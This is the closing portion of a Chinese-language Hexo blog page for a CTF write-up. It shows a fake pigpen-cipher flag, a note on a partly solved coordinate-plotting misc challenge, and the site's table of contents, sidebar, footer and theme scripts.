+<pre><code>flag{this_isa_pigpen_fake_flag}</code></pre><h3 id="misc2（忘记啥名字了）"><a href="#misc2（忘记啥名字了）" class="headerlink" title="misc2（忘记啥名字了）"></a>misc2（忘记啥名字了）</h3><p>解了一半和国赛那个坐标画图得基本一样坐标没找全画出这个玩意：</p>
+<img src="https://goodcheerleung.gitee.io/macpic//image-20210523193636029.png" alt="image-20210523193636029" style="zoom:50%;">
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/articles/CISCN2021upload.html" rel="prev" title="CISCN2021-upload">
+      <i class="fa fa-chevron-left"></i> CISCN2021-upload
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#old"><span class="nav-number">1.1.</span> <span class="nav-text">old</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#try-js"><span class="nav-number">1.2.</span> <span class="nav-text">try_js</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">2.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PWN1（BabyNote）"><span class="nav-number">2.1.</span> <span class="nav-text">PWN1（BabyNote）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PWN2-BabyNote-revenge"><span class="nav-number">2.2.</span> <span class="nav-text">PWN2 BabyNote_revenge</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-number">3.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#这是道签到题"><span class="nav-number">3.1.</span> <span class="nav-text">这是道签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CRYPTOCRYPTO"><span class="nav-number">3.2.</span> <span class="nav-text">CRYPTOCRYPTO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rsarsa"><span class="nav-number">3.3.</span> <span class="nav-text">rsarsa</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">4.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#你看看是什么"><span class="nav-number">4.1.</span> <span class="nav-text">你看看是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小猪的家"><span class="nav-number">4.2.</span> <span class="nav-text">小猪的家</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc2（忘记啥名字了）"><span class="nav-number">4.3.</span> <span class="nav-text">misc2（忘记啥名字了）</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="XiaoLeung"
+      src="/header.jpg">
+  <p class="site-author-name" itemprop="name">XiaoLeung</p>
+  <div class="site-description" itemprop="description">随笔、分享、记录生活</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">80</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.redmango.top/" title="https://www.redmango.top/" rel="noopener" target="_blank">HhhM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://l1near.top/" title="https://l1near.top/" rel="noopener" target="_blank">L1nearのspace</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.mrskye.cn/" title="https://www.mrskye.cn/" rel="noopener" target="_blank">SkYe's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.kawhi.xyz" title="https://www.kawhi.xyz" rel="noopener" target="_blank">kawhi</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn" rel="noopener" target="_blank">粤ICP备18132442号-1 </a>
+      <img src="/gongan.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" rel="noopener" target="_blank">粤公网安备 44011202000643号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">XiaoLeung</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">306k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:38</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=true&web_id=true"></script>
+  </div>
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
